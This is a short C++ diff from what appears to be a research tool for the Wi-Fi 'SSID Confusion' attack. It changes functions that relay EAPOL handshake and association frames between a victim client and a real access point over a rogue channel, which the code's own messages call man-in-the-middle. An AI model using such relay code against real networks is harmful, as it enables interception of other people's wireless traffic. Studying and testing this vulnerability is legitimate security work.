@@ -59,9 +59,9 @@ FrameProcess SsidConfusion::handle_open_auth(const HWAddress<6> &addr2, Dot11 &d
 FrameProcess SsidConfusion::handle_eapol_rogue(const HWAddress<6> addr2, const PDU &pdu, const frame_raw_t &raw) const {
 	// EAPOL STA -> AP
 	if(addr2 == sta.get(SK::mac) && is_eapol(pdu)) {
-		const int msg = get_eapol_msg_num(pdu);
-		if(msg == 1 || msg == 3) return STOP; //block cycles
-		if(msg != -1) return CONTINUE;
+		const auto msg = get_eapol_msg_num(raw);
+		if(msg == EapolMsg::Msg1 || msg == EapolMsg::Msg3) return STOP; //block cycles
+		if(msg == EapolMsg::Msg2 || msg == EapolMsg::Msg4) return CONTINUE;
 		display_traffic(pdu, "Rogue channel", " STA -> AP  -- MitM'ing");
 		send_to_real(raw);
 		return STOP;
@@ -86,7 +86,6 @@ FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &, Dot11 &do
 
 	display_traffic(dot11, "Rogue channel", " -- MitMing (relay to real)");
 	client_state.update_state(ClientState::Associated);
-	//add_station_authorized(rogue_ap->get_ap_iface(), client_state.get_mac(), rogue_ap[SK::netns]);
 
 	// SME-mode clients (NL80211_CMD_CONNECT) skip explicit auth; inject synthetic open
 	// auth to real AP so it has authenticated state before the assoc arrives.
